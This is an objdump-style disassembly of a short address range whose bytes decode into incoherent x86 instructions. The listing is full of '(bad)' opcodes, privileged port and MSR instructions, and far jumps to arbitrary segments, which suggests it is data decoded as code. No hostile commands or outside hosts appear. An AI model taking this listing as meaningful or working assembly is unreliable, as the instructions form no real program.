  421b2c:	inc    ebx
  421b2d:	xlat   BYTE PTR ds:[ebx]
  421b2e:	xlat   BYTE PTR ds:[ebx]
  421b2f:	cmp    DWORD PTR [ebx],edx
  421b31:	mov    ss,WORD PTR [eax]
  421b33:	add    DWORD PTR [ebx-0x17],edx
  421b36:	dec    ebx
  421b37:	mov    bh,0xdf
  421b39:	and    al,0xaf
  421b3b:	dec    esi
  421b3c:	js     0x421b90
  421b3e:	cwde   
  421b3f:	dec    ecx
  421b40:	ins    DWORD PTR es:[edi],dx
  421b41:	xor    al,ch
  421b43:	jl     0x421bb1
  421b45:	popf   
  421b46:	xor    bl,cl
  421b48:	push   edi
  421b49:	sahf   
  421b4a:	jmp    0x1d33:0x7d20f93b
  421b51:	nop
  421b52:	sbb    dl,BYTE PTR [ebp+0x4fb8f1ec]
  421b58:	xchg   ebx,eax
  421b59:	sub    al,0xba
  421b5b:	lock mov ds,WORD PTR [ecx]
  421b5e:	shl    DWORD PTR [ecx-0x19],1
  421b61:	ret    0xbd8a
  421b64:	daa    
  421b65:	xor    edx,DWORD PTR [eax-0x59]
  421b68:	sub    DWORD PTR [esi-0x74d352fd],esp
  421b6e:	or     al,0xd7
  421b70:	lds    edx,FWORD PTR [esi]
  421b72:	and    bl,BYTE PTR [ebp-0x1d]
  421b75:	retf   0xf6ef
  421b78:	or     DWORD PTR [ebx+0x3d775195],0x36
  421b7f:	mov    bl,0xad
  421b81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b82:	cwde   
  421b83:	sub    dh,BYTE PTR [edx-0x12]
  421b86:	mov    WORD PTR [ebx-0xb],?
  421b89:	stc    
  421b8a:	sar    DWORD PTR [ebp+0x31],0x9a
  421b8e:	push   es
  421b8f:	in     eax,0x61
  421b91:	xchg   BYTE PTR [edi+eiz*1-0x14],ch
  421b95:	dec    ecx
  421b96:	xor    ch,dh
  421b98:	popf   
  421b99:	and    DWORD PTR [ecx],edi
  421b9b:	fsubr  st,st(4)
  421b9d:	inc    eax
  421b9e:	or     al,0xc
  421ba0:	aad    0xf
  421ba2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ba3:	add    dh,BYTE PTR [ecx+eax*1]
  421ba6:	lahf   
  421ba7:	mov    al,ds:0xe4c2109
  421bac:	int3   
  421bad:	pusha  
  421bae:	div    BYTE PTR [ebx]
  421bb0:	mulps  xmm3,XMMWORD PTR [esi+0xe9f97ca]
  421bb7:	fmul   DWORD PTR [ebx-0x1688dcc]
  421bbd:	lods   al,BYTE PTR cs:[esi]
  421bbf:	and    BYTE PTR [edi+0x6b040597],bl
  421bc5:	mov    bl,0xeb
  421bc7:	pop    edx
  421bc8:	adc    cl,al
  421bca:	and    eax,0x47733cf2
  421bcf:	and    BYTE PTR [esi-0x4d],bl
  421bd2:	mov    si,0x11aa
  421bd6:	(bad)  
  421bd7:	xor    ah,ah
  421bd9:	retf   0xa777
  421bdc:	mov    esi,0x797b8ea9
  421be1:	icebp  
  421be2:	sbb    ch,ch
  421be4:	push   ss
  421be5:	ins    DWORD PTR es:[edi],dx
  421be6:	xor    cl,BYTE PTR [esi]
  421be8:	jle    0x421be9
  421bea:	mov    bl,0xaf
  421bec:	(bad)  
  421bed:	jne    0x421c4d
  421bef:	xchg   DWORD PTR [ebx+0x16],ebp
  421bf2:	repz pusha 
  421bf4:	dec    edx
  421bf5:	mov    esi,0x20763238
  421bfa:	stos   BYTE PTR es:[edi],al
  421bfb:	xchg   edx,eax
  421bfc:	adc    ah,BYTE PTR [esi-0x11]
  421bff:	in     al,0xbe
  421c01:	inc    esp
  421c02:	cmp    DWORD PTR [edx+ebx*2],0x6c
  421c06:	out    dx,eax
  421c07:	das    
  421c08:	into   
  421c09:	stc    
  421c0a:	add    DWORD PTR ds:0xe8662f38,esp
  421c10:	mov    ecx,0xcb824ac2
  421c15:	je     0x421c23
  421c17:	sub    dh,ah
  421c19:	loope  0x421c7f
  421c1b:	sub    BYTE PTR [edx+0x59f1aafb],al
  421c21:	es ds dec esi
  421c24:	es aas 
  421c26:	fld    QWORD PTR [ebx-0x6f]
  421c29:	xor    al,0x59
  421c2b:	sahf   
  421c2c:	dec    esp
  421c2d:	push   esp
  421c2e:	loopne 0x421be6
  421c30:	lds    ecx,FWORD PTR [edi+0xb]
  421c33:	iret   
  421c34:	jo     0x421ca7
  421c36:	add    edx,DWORD PTR [eax-0x4300321]
  421c3c:	les    edx,FWORD PTR [ecx]
  421c3e:	cmp    BYTE PTR [eax+0xac14cca],dl
  421c44:	push   esp
  421c45:	mov    ds:0xaa35ebda,al
  421c4a:	push   edi
  421c4b:	adc    ebx,DWORD PTR [ebp+0x7f]
  421c4e:	jl     0x421cb1
  421c50:	pop    esp
  421c51:	mov    bh,0x77
  421c53:	mov    esi,0x55a26adc
  421c58:	rcl    DWORD PTR [eax-0x19],1
  421c5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c5c:	push   esi
  421c5d:	adc    esi,DWORD PTR [edx-0xdcc6f2f]
  421c63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c64:	out    0xd1,eax
  421c66:	adc    ebx,ebx
  421c68:	outs   dx,DWORD PTR ds:[esi]
  421c69:	or     dh,ah
  421c6b:	or     eax,0x8532d95a
  421c70:	mov    ebp,ebx
  421c72:	pusha  
  421c73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c74:	retf   0xf848
  421c77:	std    
  421c78:	jno    0x421cef
  421c7a:	sbb    edi,DWORD PTR [edi+0xaf7d2ee]
  421c80:	dec    ebx
  421c81:	hlt    
  421c82:	pop    edx
  421c83:	in     al,0xd3
  421c85:	xchg   esi,eax
  421c86:	cmp    esp,edx
  421c88:	mov    ds:0x67e3460b,eax
  421c8d:	call   0xe4473800
  421c92:	xchg   edi,eax
  421c93:	mov    ds,WORD PTR [edx-0x11944e96]
  421c99:	xchg   edx,eax
	...
  421d12:	add    BYTE PTR [eax],al
  421d14:	arpl   WORD PTR [esi+0x63ff63be],bx
  421d1a:	call   FWORD PTR [esi-0x676d79db]
  421d20:	imul   BYTE PTR [edi-0x3d]
  421d23:	test   eax,0x1b48b
  421d28:	outs   dx,BYTE PTR ds:[esi]
  421d29:	pop    es
  421d2a:	add    BYTE PTR [eax],al
  421d2c:	cdq    
  421d2d:	fistp  QWORD PTR [edx-0x2b]
  421d30:	ins    BYTE PTR es:[edi],dx
  421d31:	(bad)  
  421d32:	sbb    BYTE PTR [esi+0x5fd7ac3d],ah
  421d38:	mov    al,0x8d
  421d3a:	inc    ecx
  421d3b:	(bad)  [ebp-0x3d4520b8]
  421d41:	pop    ebp
  421d42:	test   BYTE PTR [ebp*1+0x7a675f50],dh
  421d49:	repnz iret 
  421d4b:	out    dx,al
  421d4c:	sbb    ch,dh
  421d4e:	push   es
  421d4f:	and    eax,0xab44e987
  421d54:	and    esp,edx
  421d56:	jg     0x421d5c
  421d58:	mov    edi,DWORD PTR [ebp+0x2d]
  421d5b:	or     al,0x23
  421d5d:	cwde   
  421d5e:	ret    0x42ad
  421d61:	jle    0x421d3d
  421d63:	and    BYTE PTR [ebx-0x68af0fe9],dh
  421d69:	pop    ecx
  421d6a:	mov    ecx,DWORD PTR [edx-0x72]
  421d6d:	inc    ebp
  421d6e:	imul   edi,DWORD PTR [esi],0xe938253e
  421d74:	xor    esp,DWORD PTR [ecx]
  421d76:	jp     0x421db9
  421d78:	jg     0x421dab
  421d7a:	stos   DWORD PTR es:[edi],eax
  421d7b:	sub    BYTE PTR [ecx-0x168a7da7],al
  421d81:	das    
  421d82:	cmp    al,BYTE PTR [ebx+0x4]
  421d85:	cmp    cl,bl
  421d87:	cmp    dl,0x45
  421d8a:	pop    ecx
  421d8b:	xor    al,BYTE PTR [ecx]
  421d8d:	sbb    al,0xfe
  421d8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d91:	mov    bl,0xcf
  421d93:	and    al,0x6f
  421d95:	cmp    eax,0xae72a5d9
  421d9a:	push   es
  421d9b:	add    ecx,edx
  421d9d:	ret    0xdf42
  421da0:	ds mov eax,0xab2db47e
  421da6:	mov    ds:0x660408a9,al
  421dab:	or     eax,0x4e79a433
  421db0:	sahf   
  421db1:	sub    edi,DWORD PTR [edi+esi*2]
  421db4:	lock fist WORD PTR [eax*8-0x12902cdb]
  421dbc:	lock xor DWORD PTR [esi+0x6220d1bb],ebp
  421dc3:	xchg   ebx,eax
  421dc4:	cmc    
  421dc5:	enter  0xb0fe,0x3e
  421dc9:	in     al,dx
  421dca:	stc    
  421dcb:	jge    0x421e12
  421dcd:	repz push cs
  421dcf:	inc    ecx
  421dd0:	ss mov dh,0x6e
  421dd3:	mov    ch,0xad
  421dd5:	rcl    BYTE PTR [edi-0x6676854],0xed
  421ddc:	lds    ecx,FWORD PTR [ebx-0x57]
  421ddf:	jns    0x421dfd
  421de1:	mov    DWORD PTR [esi-0x4d],ecx
  421de4:	push   edi
  421de5:	ja     0x421da3
  421de7:	mov    dh,0xe
  421de9:	in     eax,0xf2
  421deb:	jmp    0x421e54
  421ded:	sub    DWORD PTR [edi+0x9],ebp
  421df0:	cld    
  421df1:	clc    
  421df2:	repz call 0xd29b:0xe5141a3a
  421dfa:	stc    
  421dfb:	mov    ebx,0x7f6a0740
  421e00:	push   esp
  421e01:	cmp    BYTE PTR [esi],bh
  421e03:	adc    esi,edi
  421e05:	xor    BYTE PTR [esi+0x24],dh
  421e08:	mul    BYTE PTR [edx+0x3ea77c54]
  421e0e:	call   0xd9c131da
  421e13:	in     eax,0x83
  421e15:	shl    ch,0x10
  421e18:	ins    DWORD PTR es:[edi],dx
  421e19:	test   al,0x48
  421e1b:	jnp    0x421e3e
  421e1d:	in     al,0x38
  421e1f:	into   
  421e20:	call   0x18a:0x6c115be6
  421e27:	iret   
  421e28:	fwait
  421e29:	ja     0x421e1b
  421e2b:	ret    
  421e2c:	retf   
  421e2d:	xor    eax,0x6592a213
  421e32:	ja     0x421eb1
  421e34:	or     DWORD PTR [esi-0x1d],edi
  421e37:	out    0x68,eax
  421e39:	sbb    bh,BYTE PTR [ecx-0x7bd70113]
  421e3f:	mov    ch,0x21
  421e41:	mov    al,BYTE PTR [ebp-0x5f5d7015]
  421e47:	jae    0x421e70
  421e49:	xor    dh,BYTE PTR es:[ecx+0x460ad8cf]
  421e50:	ds test al,0x40
  421e53:	mov    dh,bh
  421e55:	mov    bh,0x29
  421e57:	push   cs
  421e58:	not    DWORD PTR [ecx+0x52d6ad23]
  421e5e:	mov    bh,0x2b
  421e60:	jae    0x60588ecc
  421e66:	rcr    DWORD PTR [eax+0x427103f5],0xbd
  421e6d:	or     DWORD PTR ds:0x6ce2fcb3,eax
  421e73:	out    dx,eax
  421e74:	(bad)  
  421e75:	xchg   ebx,eax
  421e76:	mov    bl,0x72
  421e78:	or     bh,BYTE PTR [ebp+0x24]
  421e7b:	nop
  421e7c:	dec    esp
  421e7d:	inc    edi
  421e7e:	adc    eax,0xb0fbf8aa
  421e83:	icebp  
  421e84:	jmp    0xe12b:0x94ecefa7
  421e8b:	pop    esp
  421e8c:	aaa    
  421e8d:	hlt    
  421e8e:	jmp    0x9d237aa0
  421e93:	mov    esi,0xa979d429
  421e98:	enter  0x65b2,0xd8
  421e9c:	mov    eax,0xdc503b67
  421ea1:	ror    BYTE PTR [edx-0x225ea6a2],0x4b
  421ea8:	imul   ecx,DWORD PTR [edx-0x3],0x6bf3641b
  421eaf:	loope  0x421f0e
  421eb1:	and    edx,ebx
  421eb3:	lods   al,BYTE PTR ds:[esi]
  421eb4:	fs sti 
  421eb6:	imul   edi,DWORD PTR [eax+0x62],0xe84ad127
  421ebd:	scas   al,BYTE PTR es:[edi]
  421ebe:	push   es
  421ebf:	pop    ecx
  421ec0:	dec    edx
  421ec1:	pop    ebp
  421ec2:	inc    esi
  421ec3:	popf   
  421ec4:	popf   
  421ec5:	dec    ecx
  421ec6:	mov    edx,0x36286155
  421ecb:	in     al,0x58
  421ecd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ece:	mov    esp,0x7d6d78d8
  421ed3:	push   ds
  421ed4:	xchg   DWORD PTR [edi+ecx*2-0x6a],eax
  421ed8:	daa    
  421ed9:	js     0x421ecd
  421edb:	out    0x25,eax
  421edd:	mov    esp,0x86f68f6b
  421ee2:	(bad)
  421ee6:	stc    
  421ee7:	(bad)  
  421ee8:	jecxz  0x421ebc
  421eea:	test   ecx,esp
  421eec:	xchg   DWORD PTR [ebp-0x50],esp
  421eef:	outs   dx,DWORD PTR ds:[esi]
  421ef0:	and    DWORD PTR [ebx-0xa61fb9],0x4b8298c4
  421efa:	shl    ecx,1
  421efc:	mov    ds:0x6cf8a656,eax
  421f01:	mov    ecx,0x1c36e768
  421f06:	test   al,0xfa
  421f08:	adc    DWORD PTR [edx+0x24bbdf7],ecx
  421f0e:	inc    ebx
  421f0f:	xor    eax,DWORD PTR [esi-0x1]
  421f12:	pop    ds
  421f13:	gs iret 
  421f15:	inc    ebx
  421f16:	or     al,0x8f
  421f18:	in     al,0xd3
  421f1a:	mov    cl,0x6e
  421f1c:	in     al,0xcf
  421f1e:	les    ecx,FWORD PTR [edx-0x79ab0b8d]
  421f24:	dec    ebx
  421f25:	mov    ebp,0x6e13081a
  421f2a:	sahf   
  421f2b:	mov    al,ds:0xfdc43b10
  421f30:	fmul   QWORD PTR [ebx+0x11]
  421f33:	cs push esi
  421f35:	scas   al,BYTE PTR es:[edi]
  421f36:	xchg   ecx,eax
  421f37:	ret    
  421f38:	xchg   edx,eax
  421f39:	jo     0x421f68
  421f3b:	inc    edx
  421f3c:	sbb    DWORD PTR [esi],ebp
  421f3e:	jae    0x421ee5
  421f40:	sahf   
  421f41:	xchg   esp,eax
  421f42:	fdiv   DWORD PTR ds:0x25fb42a4
  421f48:	adc    eax,0x682e39fb
  421f4d:	in     al,0x41
  421f4f:	pop    esp
  421f50:	push   ebx
  421f51:	pop    ds
  421f52:	mov    al,0x9b
  421f54:	push   esi
  421f55:	out    dx,al
  421f56:	lds    edx,FWORD PTR [edi-0x2c1b6397]
  421f5c:	cmp    BYTE PTR [esp+esi*1-0x653e73d],dl
  421f63:	pop    esp
  421f64:	frstor [ecx+0xdeedc66]
  421f6a:	sbb    bh,BYTE PTR [eax]
  421f6c:	mov    esp,0x7dd0941d
  421f71:	daa    
  421f72:	xor    eax,0x602ba0e2
  421f77:	inc    edi
  421f78:	push   edx
  421f79:	gs xchg edi,eax
  421f7b:	jb     0x421f7f
  421f7d:	cld    
  421f7e:	int    0xe5
  421f80:	push   edi
  421f81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f82:	jg     0x421fcc
  421f84:	lods   al,BYTE PTR ds:[esi]
  421f85:	inc    ebp
  421f86:	popf   
  421f87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f88:	int3   
  421f89:	cmc    
  421f8a:	jl     0x421fec
  421f8c:	xchg   edi,eax
  421f8d:	std    
  421f8e:	cmp    al,0x78
  421f90:	iret   
  421f91:	sub    BYTE PTR [ebx],al
  421f93:	mov    edi,0x1138ed85
  421f98:	xor    eax,0x549f3545
  421f9d:	mov    ebx,0x44aa368a
  421fa2:	xor    esp,DWORD PTR [eax+0x7f6199d0]
  421fa8:	sub    al,0xc6
  421faa:	call   FWORD PTR [esi+esi*8-0x29]
  421fae:	pop    ebx
  421faf:	inc    eax
  421fb0:	sbb    eax,0x4e26d5b8
  421fb5:	sti    
  421fb6:	imul   ecx,DWORD PTR [ebx+0x40f968f7],0x6018420b
  421fc0:	cdq    
  421fc1:	mov    bl,0x63
  421fc3:	ror    DWORD PTR [edi],cl
  421fc5:	mov    dh,0x18
  421fc7:	out    0x9a,eax
  421fc9:	ss int 0x1c
  421fcc:	dec    ebx
  421fcd:	add    ebx,DWORD PTR [edx-0x3e]
  421fd0:	in     al,0x13
  421fd2:	je     0x422000
  421fd4:	sti    
  421fd5:	fcmovu st,st(3)
  421fd8:	sub    esi,DWORD PTR [eax]
  421fda:	loop   0x42201d
  421fdc:	xchg   ecx,eax
  421fdd:	fcom   DWORD PTR [edx+0x40b76ea0]
  421fe3:	repnz mov dl,BYTE PTR [ebx+0x2ca660bb]
  421fea:	jg     0x421ffc
  421fec:	mov    ds:0xf6dc4b63,al
  421ff1:	loopne 0x42205f
  421ff3:	out    dx,al
  421ff4:	jns    0x421f84
  421ff6:	outs   dx,DWORD PTR ds:[esi]
  421ff7:	push   cs
  421ff8:	xor    ch,0xf5
  421ffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ffc:	div    BYTE PTR [edi-0x52d89c5b]
  422002:	wrmsr  
  422004:	mov    eax,ds:0x51945656
  422009:	and    dh,bl
  42200b:	out    0xd6,al
  42200d:	(bad)  
  42200f:	push   edi
  422010:	sbb    al,0x4c
  422012:	mov    BYTE PTR [esp+eiz*4],bh
  422015:	imul   esi,DWORD PTR [esp-0x33],0xffffffae
  42201a:	xchg   esi,eax
  42201b:	mov    ebx,0xbfc88071
  422020:	cdq    
  422021:	loope  0x42206f
  422023:	sub    BYTE PTR [ecx],bh
  422025:	mov    edi,0xeebf9490
  42202a:	xchg   ebp,eax
  42202b:	xor    DWORD PTR [edi+0x3dc0f01],edx
  422031:	cmp    ebx,esi
  422033:	sbb    BYTE PTR [edi-0x7bf52573],0xc7
  42203a:	adc    eax,edi
  42203c:	popa   
  42203d:	push   0xffffffc8
  42203f:	hlt    
  422040:	push   ebp
  422041:	mov    ds:0x7a8c4cd4,eax
  422046:	cmp    ebp,DWORD PTR [ebp+0x6852d210]
  42204c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42204d:	out    dx,eax
  42204e:	inc    esp
  42204f:	push   edx
  422050:	sbb    al,BYTE PTR [edi-0x15d8acb3]
  422056:	sahf   
  422057:	xchg   ebp,eax
  422058:	pop    es
  422059:	ja     0x422060
  42205b:	dec    ebx
  42205c:	inc    esp
  42205d:	push   0x374a3617
  422062:	cmp    BYTE PTR [ebx-0x5],dh
  422065:	mov    DWORD PTR [edi+0xc0047d4],ebp
  42206b:	push   edx
  42206c:	outs   dx,BYTE PTR ds:[esi]
  42206d:	or     al,0x26
  42206f:	fdiv   QWORD PTR [esi+0x18]
  422072:	mov    eax,0x5dec7356
  422077:	xchg   BYTE PTR [edx+0x3b],al
  42207a:	jmp    0x42204a
  42207c:	(bad)  
  42207e:	fnstcw WORD PTR [edi-0x7e715f16]
  422084:	mov    ch,0xaa
  422086:	int3   
  422087:	test   BYTE PTR [eax+0x22b0a352],dh
  42208d:	pushf  
  42208e:	out    dx,al
  42208f:	retf   
  422090:	stc    
  422091:	outs   dx,DWORD PTR ds:[esi]
  422092:	inc    edi
  422093:	xchg   ecx,eax
  422094:	pop    ss
  422095:	test   eax,0x67be58e0
  42209a:	mov    ch,BYTE PTR [ecx+ebx*8]
  42209d:	frstor [esi]
  42209f:	add    DWORD PTR [ebx-0x574c4085],edi
  4220a5:	mov    bh,BYTE PTR [ebp+0x3b075576]
  4220ab:	sti    
  4220ac:	cmp    BYTE PTR [ebx],ch
  4220ae:	in     al,dx
  4220af:	sar    DWORD PTR [ebx-0x2a879c0a],cl
  4220b5:	mov    bl,0x80
  4220b7:	mov    ?,WORD PTR [esi-0x46]
  4220ba:	jecxz  0x422097
  4220bc:	mov    esp,0x30b4280e
  4220c1:	mov    dl,BYTE PTR [edx-0x33]
  4220c4:	sbb    eax,edx
  4220c6:	xchg   edi,eax
  4220c7:	call   0x7dbc:0x6d412249
  4220ce:	mov    esp,0x894465fd
  4220d3:	icebp  
  4220d4:	(bad)  
  4220d5:	push   si
  4220d7:	outs   dx,BYTE PTR ds:[esi]
  4220d8:	inc    ebx
  4220d9:	pop    ecx
  4220da:	shr    BYTE PTR ds:0xbf52944b,1
  4220e0:	lds    edi,FWORD PTR [ebx]
  4220e2:	fwait
  4220e3:	mov    WORD PTR [edi-0x1],gs
  4220e6:	add    DWORD PTR [edi+0x29a8cc50],0x1d
  4220ed:	jae    0x422111
  4220ef:	sbb    al,0x3a
  4220f1:	(bad)  
  4220f2:	inc    edi
  4220f3:	add    al,0xd5
  4220f5:	cmp    ebx,ebp
  4220f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220f8:	jmp    0xcaf4:0x345d4b4c
  4220ff:	cmp    esp,0xffffffac
  422102:	adc    DWORD PTR [edi],edx
  422104:	enter  0xd7dc,0xf3
  422108:	and    ah,0x5a
  42210b:	(bad)  
  42210c:	jmp    0x981b:0x47a5cdb2
  422113:	shr    BYTE PTR [edx-0xd],0xa6
  422117:	enter  0x4d9,0x63
  42211b:	push   edx
  42211c:	mov    bl,0xb5
  42211e:	retf   0x166b
  422121:	mov    cs,edi
  422123:	xchg   edx,eax
  422124:	push   edi
  422125:	and    edi,edx
  422127:	daa    
  422128:	xor    al,0xde
  42212a:	inc    edi
  42212b:	adc    BYTE PTR [edx-0x47ed030c],ah
  422131:	sub    dh,bh
  422133:	leave  
  422134:	outs   dx,BYTE PTR ds:[esi]
  422135:	dec    ecx
  422136:	dec    ebp
  422137:	add    eax,0xca72f7c6
  42213c:	add    esi,DWORD PTR [ecx]
  42213e:	or     DWORD PTR [esi],0xcca07fe4
  422144:	mov    ds:0x39e7a822,eax
  422149:	xchg   BYTE PTR [esi*1-0x3708c65a],ah
  422150:	ret    0x944
  422153:	inc    dx
  422155:	stos   BYTE PTR es:[edi],al
  422156:	js     0x4220e1
  422158:	mov    al,ds:0x5eea67e2
  42215d:	or     eax,0x8fe882dd
  422162:	pop    eax
  422163:	push   cs
  422164:	leave  
  422165:	leave  
  422166:	sbb    dl,al
  422168:	stc    
  422169:	scas   al,BYTE PTR es:[edi]
  42216a:	and    eax,0x31877898
  42216f:	repz xchg esp,eax
  422171:	mov    bh,0x2c
  422173:	ret    
  422174:	adc    ah,ch
  422176:	fild   QWORD PTR [edi]
  422178:	lahf   
  422179:	inc    esi
  42217a:	dec    edi
  42217b:	xadd   DWORD PTR [ebp-0x9],esi
  42217f:	test   DWORD PTR [esp+edx*1],esp
  422182:	mov    esi,0x536009a1
  422187:	loope  0x42212c
  422189:	push   edi
  42218a:	mov    ah,0xba
  42218c:	in     al,dx
  42218d:	mov    ebx,0x975cde54
  422192:	jae    0x42211c
  422194:	xor    eax,0xf006edf4
  422199:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42219a:	mov    ebx,0x91830260
  4221a0:	in     eax,0xfb
  4221a2:	lock sbb al,0xa9
  4221a5:	mov    ss,WORD PTR [edx-0x77]
  4221a8:	xchg   ecx,eax
  4221a9:	int    0x5f
  4221ab:	mov    ebp,0x201efaac
  4221b0:	cs mov dl,0x7a
  4221b3:	leave  
  4221b4:	jmp    FWORD PTR [edi]
  4221b6:	js     0x4221d9
  4221b8:	mov    ecx,0x6612fb87
  4221bd:	mov    cl,0x50
  4221bf:	inc    edx
  4221c0:	mov    eax,0x4c1b951a
  4221c5:	(bad)  
  4221c6:	cwde   
  4221c7:	jmp    0x1f35:0x8da8ba98
  4221ce:	test   DWORD PTR [edi-0x7c65e6dd],esi
  4221d4:	xor    DWORD PTR [ecx+0x5a4ab037],edi
  4221da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221db:	jmp    0x9fab7d03
  4221e0:	nop
  4221e1:	lea    ebp,[esi]
  4221e3:	add    al,0x3
  4221e5:	(bad)  
  4221e6:	lock push ebx
  4221e8:	addr16 mov ecx,fs
  4221eb:	lea    esp,[edi-0x17887ce9]
  4221f1:	push   0x227c9984
  4221f6:	inc    BYTE PTR ds:0xe5f27748
  4221fc:	and    al,0x83
  4221fe:	jmp    0xe2347869
  422203:	adc    DWORD PTR [edi],edx
  422205:	cld    
  422206:	aaa    
  422207:	xor    dh,ah
  422209:	jp     0x422235
  42220b:	jge    0x42221e
  42220d:	pusha  
  42220e:	cmp    BYTE PTR [esi-0x16],dl
  422211:	mov    bl,0x9d
  422213:	jg     0x4221da
  422215:	repz cmp BYTE PTR [edx+0x38741d91],cl
  42221c:	add    eax,0x30788c6f
  422221:	sub    edi,esi
  422223:	pop    ecx
  422224:	scas   eax,DWORD PTR es:[edi]
  422225:	add    al,0x57
  422227:	xchg   edx,eax
  422228:	shl    dh,0xa4
  42222b:	shr    BYTE PTR [eax],0xfe
  42222e:	pushf  
  42222f:	setnp  BYTE PTR [ecx-0x4dbc92c3]
  422236:	in     eax,0x3d
  422238:	jmp    0x4ce39c9a
  42223d:	mov    WORD PTR [edx+ebx*1-0x62],ss
  422241:	sub    DWORD PTR [ebx*4-0x9d1b462],ecx
  422248:	jne    0x42227a
  42224a:	ret    0xf6d2
  42224d:	lahf   
  42224e:	dec    esi
  42224f:	fistp  QWORD PTR [eax]
  422251:	adc    dh,BYTE PTR ss:[esi]
  422254:	repnz (bad) 
  422256:	out    dx,al
  422257:	inc    ebp
  422258:	nop
  422259:	inc    edi
  42225a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42225b:	mov    ch,0x5b
  42225d:	aad    0x2e
  42225f:	rcr    DWORD PTR [ebp-0x2f],cl
  422262:	xchg   edi,eax
  422263:	ja     0x4222d3
  422265:	shl    DWORD PTR [edx-0x142938a3],cl
  42226b:	sbb    eax,0x89ff6476
  422270:	jmp    0xcc8c2db9
  422275:	fbld   TBYTE PTR [edx+0x3c711dd]
  42227b:	sahf   
  42227c:	add    DWORD PTR [edi+0x5f],esi
  42227f:	xor    al,0x87
  422281:	test   eax,0xebfc2a7b
  422286:	jb     0x422307
  422288:	jle    0x422269
  42228a:	lea    edi,[ebp+0x4bea7eea]
  422290:	ret    
  422291:	lods   al,BYTE PTR ds:[esi]
  422292:	xor    DWORD PTR [edi+0x6790860f],ebx
  422298:	and    DWORD PTR [edi-0x14bf69d],ecx
  42229e:	es shl edi,cl
  4222a1:	test   eax,0xad3827c3
  4222a6:	or     al,0x22
  4222a8:	sbb    eax,DWORD PTR [esi-0x51]
  4222ab:	lahf   
  4222ac:	aad    0x1b
  4222ae:	pushf  
  4222af:	pop    ecx
  4222b0:	add    DWORD PTR ds:0xd43c6935,esp
  4222b6:	pop    edx
  4222b7:	dec    edi
  4222b8:	mov    ah,0x55
  4222ba:	jo     0x42229d
  4222bc:	sub    DWORD PTR [ecx],ebx
  4222be:	jmp    0x422331
  4222c0:	push   0x946a2c27
  4222c5:	pop    ebp
  4222c6:	sub    DWORD PTR [esi+0x4f978642],esp
  4222cc:	out    dx,eax
  4222cd:	add    DWORD PTR [di+0xa1b],eax
  4222d2:	jl     0x4222df
  4222d4:	test   al,0x12
  4222d6:	ret    
  4222d7:	pop    ebp
  4222d8:	jle    0x422337
  4222da:	ror    DWORD PTR [ecx],1
  4222dc:	adc    DWORD PTR [eax],0xffffffc9
  4222df:	jmp    0xd0d4fac7
  4222e4:	mov    edx,0xf4ac2da7
  4222e9:	adc    DWORD PTR [ebp-0x3d],ecx
  4222ec:	aam    0x3c
  4222ee:	sub    eax,DWORD PTR [edx]
  4222f0:	push   edi
  4222f1:	and    DWORD PTR [ebp-0x55971a14],ebp
  4222f7:	cmp    al,0x19
  4222f9:	jno    0x42230c
  4222fb:	mov    BYTE PTR [edx+0x62],dl
  4222fe:	mov    esi,0x655d5f03
  422303:	xor    BYTE PTR [ebp+0x2b],cl
  422306:	repnz stc 
  422308:	sub    al,0x4a
  42230a:	jmp    0x42229d
  42230c:	or     ch,dh
  42230e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42230f:	inc    eax
  422310:	mov    bl,0xc5
  422312:	aad    0x1f
  422314:	adc    ebx,DWORD PTR [eax]
  422316:	and    BYTE PTR ds:0x10305c26,ah
  42231c:	inc    ch
  42231e:	(bad)  
  42231f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422321:	lock dec esi
  422323:	retf   0xdfa1
  422326:	popf   
  422327:	push   0xffffffb7
  422329:	sub    ebx,DWORD PTR [ebx+0x798177ad]
  42232f:	jns    0x422323
  422331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422332:	loopne 0x4222b9
  422334:	add    eax,0x69e122a6
  422339:	mov    BYTE PTR [esi+0x62],ah
  42233c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42233d:	sub    ebp,DWORD PTR [eax]
  42233f:	cmp    esp,DWORD PTR [edx-0x78]
  422342:	jno    0x422336
  422344:	pusha  
  422345:	pop    ecx
  422346:	pop    edi
  422347:	cmc    
  422348:	in     al,dx
  422349:	cmp    BYTE PTR [ecx+ebx*2+0x0],0xf0
  42234e:	push   ss
  42234f:	fadd   DWORD PTR [esi+0x52]
  422352:	mov    bh,0x9e
  422354:	inc    ebp
  422355:	js     0x4223d6
  422357:	mov    ?,WORD PTR [ecx+0x5e406309]
  42235d:	cmp    al,BYTE PTR [edi+0x5d]
  422360:	xchg   edi,eax
  422361:	push   ebp
  422362:	sbb    ebx,DWORD PTR [esi+0x625c3cc3]
  422368:	cmp    al,0xc7
  42236a:	aad    0x54
  42236c:	iret   
  42236d:	xchg   ebp,eax
  42236e:	or     BYTE PTR [eax-0x72],ch
  422371:	jp     0x4223e2
  422373:	aaa    
  422374:	fcomp  QWORD PTR gs:[ebp-0x2c0e831e]
  42237b:	sub    eax,ebp
  42237d:	(bad)  
  42237e:	shl    DWORD PTR [ebp-0x2dd31b5c],0x7e
  422385:	les    edi,FWORD PTR [ebp-0x67e9dbed]
  42238b:	or     al,BYTE PTR [eax]
  42238d:	test   al,0x83
  42238f:	xchg   edi,eax
  422390:	out    dx,al
  422391:	xchg   ecx,eax
  422392:	adc    eax,0xfdbe8cb0
  422397:	push   edx
